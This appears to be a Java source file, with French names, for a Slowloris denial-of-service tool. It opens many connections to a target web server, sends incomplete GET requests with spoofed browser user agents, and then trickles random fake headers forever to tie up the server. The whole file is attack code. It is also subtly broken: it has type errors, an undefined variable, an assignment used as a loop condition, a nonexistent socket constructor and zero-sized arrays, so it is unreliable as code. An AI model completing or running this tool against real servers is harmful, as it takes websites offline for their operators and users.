//thanks to https://github.com/gkbrk/slowloris/blob/master/slowloris.py
//thanks to https://github.com/Connor-F/jSlowLoris
//thanks to https://www.youtube.com/watch?v=XiFkyR35v2Y

import java.net.URL;
import java.net.Socket;
import java.lang.Math;
import java.net.MalformedURLException;

public class slowLoris
{
    public static void main(String[] args)
    {
        try
        {
            final int PORT_CIBLE = 80;
            final int NB_THREADS_ATTAQUE = 0;
            URL url_cible = new URL("testUrl");
          
            final int MULTIPLICATEUR = 10;
    
            for(int i=0; i<NB_THREADS_ATTAQUE ;i++)
            {
                new Thread(new Connexions(PORT_CIBLE,url_cible,MULTIPLICATEUR)).start();
            }
        }
        catch(Exception e)
        {
            
        }
       
    }
}

public class Connexions implements Runnable
{
    
    protected URL urlCible;
    protected int multiplicateur;
    protected int port;
    protected Socket[] mesSockets = new Socket[multiplicateur];
    protected String[] mesRequetes = new String[multiplicateur];

    public Connexions(int port,URL url, int multiplicateur)
    {
        this.port= port;
        this.urlCible = url;
        this.multiplicateur = multiplicateur;
        this.mesRequetes = creerRequetesAttaques();

        for(int i=0; i<multiplicateur;i++)
        {
            preparerConnexion(i);
        }
    }

    protected String[] creerRequetesAttaques()
    {
        String get = "GET " + urlCible.getPath() + " HTTP/1.1\r\n";
        String attrHost = "Host: " + urlCible.getHost() + port + "\r\n";
        String attrContentType = "Content-Type: */* \r\n";
        String attrConnection = "Connection: keep-alive\r\n";

        //from http://useragent.fr/page/google-chrome
        String[]  userAgentsPopulaires = {
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31",            
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.110 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31"           
        };

        String[] res = new String[multiplicateur];
        for(int i=0; i<multiplicateur ;i++)
        {
            int indexRandom = Math.random() * ( userAgentsPopulaires.length );
            res[i] = get + attrHost + attrContentType + attrConnection + userAgentsPopulaires[indexRandom] + "\r\n";
        }

        return res;
    }

    protected void preparerConnexion(int cpt)
    {
        try
        {
            mesSockets[i] = new Socket(urlCible,port); //ou alors essayer sans le http:// de l'url
        }
        catch(Exception e)
        {

        }
    }

    protected void garderConnexionOuverte()
    {
        for(int i=0; i < multiplicateur; i++)
        {
            envoyerMauvaisHeader(i);
            //temporisation
            try
            {
                Thread.sleep(400);
            }
            catch(Exception e)
            {

            }
        }
    }

    protected void envoyerRequete(int cpt)
    {              
        try
        {
            int indiceDeRequeteAuHasard = Math.random() * ( multiplicateur );
            mesSockets[cpt].getOutputStream().write(mesRequetes[indiceDeRequeteAuHasard].getBytes());
        }
        catch(Exception e)
        {

        }
    }

    protected void envoyerMauvaisHeader(int cpt)
    {
        char[] listOfChars = new char[26];
        int i = 0;
        for(char myChar ='A'; myChar ='Z'; myChar++)
        {
            listOfChars[i] = myChar;
            i++;
        }

        int indiceAleaTitreChamp = Math.random() * ( listOfChars.length );
        int indiceAleaTitreChamp2 = Math.random() * ( listOfChars.length );
        int indiceAleaValChamp = Math.random() * ( listOfChars.length );
        String monFauxChamp = listOfChars[indiceAleaTitreChamp] + "-" + listOfChars[indiceAleaTitreChamp2] + ": " + Integer.toString(indiceAleaValChamp) + "\r\n";

        try
        {
            mesSockets[cpt].getOutputStream().write(monFauxChamp.getBytes());
        }
        catch(Exception e)
        {
            preparerConnexion(cpt);
        }
    }

    @Override
    public void run()
    {
        for(int i=0; i < multiplicateur; i++)
        {
            envoyerRequete(i);
            //temporisation
            try
            {
                Thread.sleep(400);
            }
            catch(Exception e)
            {

            }
        }

        while(true)
        {
            garderConnexionOuverte();
        }
    }  

    
}
